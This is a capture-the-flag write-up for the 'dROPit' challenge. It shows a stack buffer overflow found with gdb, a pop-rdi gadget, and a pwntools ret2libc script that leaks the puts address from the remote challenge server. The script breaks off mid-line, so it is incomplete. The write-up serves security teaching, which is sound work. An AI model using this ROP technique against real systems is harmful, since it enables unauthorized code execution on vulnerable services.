# dROPit

## Task

You're on your own this time. Can you get a shell?

nc challenges.ctfd.io 30261

Hint: https://libc.rip

File: dropit

## Solution

```bash  
$ file dropit  
dropit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=d88dcfc6ecf55a474a7d461e14648e545a0522fa, for GNU/Linux 3.2.0,
not stripped  
$ checksec dropit  
CANARY    : disabled  
FORTIFY   : disabled  
NX        : ENABLED  
PIE       : disabled  
RELRO     : FULL  
```

Like the name implies, we have to use ROP.

It was my first time doing this successfully and I struggled for a while until
I found this very good tutorial:
https://gr4n173.github.io/2020/07/11/ret2libc.html

You should definitely read it if you don't know what ROP is or how to pull it
of.

I liked it very much. I have stored these files in the `dropit-files` folder
if you want to try it yourself.

What we basically do is:

- overflow the buffer  
- use a gadget to move the address of `puts@got` into `rdi`  
- use a function from the binary `puts@plt` to leak that address  
- return to `main` to read the adjusted payload

Step 1:

```nasm  
gdb-peda$ disass main  
Dump of assembler code for function main:  
  0x0000000000401146 <+0>:     push   rbp  
  0x0000000000401147 <+1>:     mov    rbp,rsp  
  0x000000000040114a <+4>:     sub    rsp,0x30  
  0x000000000040114e <+8>:     mov    rax,QWORD PTR [rip+0x2ebb]        #
0x404010 <stdout@@GLIBC_2.2.5>  
  0x0000000000401155 <+15>:    mov    ecx,0x0  
  0x000000000040115a <+20>:    mov    edx,0x2  
  0x000000000040115f <+25>:    mov    esi,0x0  
  0x0000000000401164 <+30>:    mov    rdi,rax  
  0x0000000000401167 <+33>:    call   0x401050 <setvbuf@plt>  
  0x000000000040116c <+38>:    mov    edi,0x402004  
  0x0000000000401171 <+43>:    call   0x401030 <puts@plt>  
  0x0000000000401176 <+48>:    mov    rdx,QWORD PTR [rip+0x2ea3]        #
0x404020 <stdin@@GLIBC_2.2.5>  
  0x000000000040117d <+55>:    lea    rax,[rbp-0x30]  
  0x0000000000401181 <+59>:    mov    esi,0x64  
  0x0000000000401186 <+64>:    mov    rdi,rax  
  0x0000000000401189 <+67>:    call   0x401040 <fgets@plt>  
  0x000000000040118e <+72>:    mov    eax,0x0  
  0x0000000000401193 <+77>:    leave  
  0x0000000000401194 <+78>:    ret  
End of assembler dump.  
```

We call `char *fgets(char *s, int size, FILE *stream)` with `size = 0x64` but
our stack is only `0x30`. Let's create a pattern and set a breakpoint at
`<+78>`.

```nasm  
gdb-peda$ b *0x0000000000401194  
Breakpoint 1 at 0x401194  
gdb-peda$ pattern create 100 pattern.txt  
Writing pattern of 100 chars to filename "pattern.txt"  
gdb-peda$ r < pattern.txt  
Breakpoint 1, 0x0000000000401194 in main ()  
gdb-peda$ info register rsp  
rsp            0x7fffffffe1f8      0x7fffffffe1f8  
gdb-peda$ x/s 0x7fffffffe1f8  
0x7fffffffe1f8: "AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA"  
gdb-peda$ pattern offset "AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA"  
AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA found at offset: 56  
```

We could now use `dumprop` to display our possible gadgets, but `pwntools` can
handle that for us as well. We also need the `puts@plt` address and
`puts@got`. While we are there let's get `main` too:

```nasm  
gdb-peda$ dumprop binary "pop rdi"  
Warning: this can be very slow, do not run for large memory range  
Writing ROP gadgets to file: dropit-rop.txt ...  
0x401203: pop rdi; ret  
gdb-peda$ info functions main  
All functions matching regular expression "main":

Non-debugging symbols:  
0x0000000000  main  
gdb-peda$ info functions puts@plt  
All functions matching regular expression "puts@plt":

Non-debugging symbols:  
0x0000000000401030  puts@plt  
gdb-peda$ readelf  
...  
.got = 0x403fb0  
...  
gdb-peda$ x/8a 0x403fb0  
0x403fb0:       0x403dc0        0x0  
0x403fc0:       0x0     0x7ffff7e4d380 <puts>  
```

Finding the `got` address in gdb can be tricky, a better way is `readelf`:

```bash  
$ readelf --relocs dropit

Relocation section '.rela.dyn' at offset 0x4e8 contains 6 entries:  
 Offset          Info           Type           Sym. Value    Sym. Name +
Addend  
000000403fe0  000100000006 R_X86_64_GLOB_DAT 0000000000000000
_ITM_deregisterTM[...] + 0  
000000403fe8  000300000006 R_X86_64_GLOB_DAT 0000000000000000
__libc_start_main@GLIBC_2.2.5 + 0  
000000403ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ +
0  
000000403ff8  000700000006 R_X86_64_GLOB_DAT 0000000000000000
_ITM_registerTMCl[...] + 0  
000000404010  000800000005 R_X86_64_COPY     0000000000404010
stdout@GLIBC_2.2.5 + 0  
000000404020  000900000005 R_X86_64_COPY     0000000000404020
stdin@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x578 contains 3 entries:  
 Offset          Info           Type           Sym. Value    Sym. Name +
Addend  
000000403fc8  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5
+ 0  
000000403fd0  000400000007 R_X86_64_JUMP_SLO 0000000000000000
fgets@GLIBC_2.2.5 + 0  
000000403fd8  000600000007 R_X86_64_JUMP_SLO 0000000000000000
setvbuf@GLIBC_2.2.5 + 0  
```

We now have everything we need to leak the libc address of `puts`. We then can
identify the libc version via https://libc.rip and continue coding.

But let's do it with pwntools. This is mainly the code from the tutorial
mentioned before, but written by me step by step:

```python  
#!/usr/bin/env python2  
from pwn import *  
import struct  
import binascii

elf = ELF("./dropit")  
rop = ROP(elf)

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0] # 0x401203  
PUTS_GOT = elf.got['puts'] # 0x403fc8  
PUTS_PLT = elf.plt['puts'] # 0x401030  
MAIN = elf.symbols['main'] # 0x401146

info("pop rdi;ret: %s" % hex(POP_RDI))  
info("puts@got: %s" % hex(PUTS_GOT))  
info("puts@plt: %s" % hex(PUTS_PLT))  
info("main: %s" % hex(MAIN))

payload  = 'A' * 56  
payload += p64(POP_RDI)  
payload += p64(PUTS_GOT)  
payload += p64(PUTS_PLT)  
payload += p64(MAIN)

p = remote('challenges.ctfd.io', 30261)

info(binascii.hexlify(p.recv()))  
info(binascii.hexlify(p.recv()))  
p.sendline(payload)  
puts_remote_raw = p.recv()  
info(binascii.hexlify(p.recv()))

leak = struct.unpack("

Original writeup (https://github.com/klassiker/ctf-
writeups/blob/master/2020/newark-academy/binary-exploitation/dropit.md).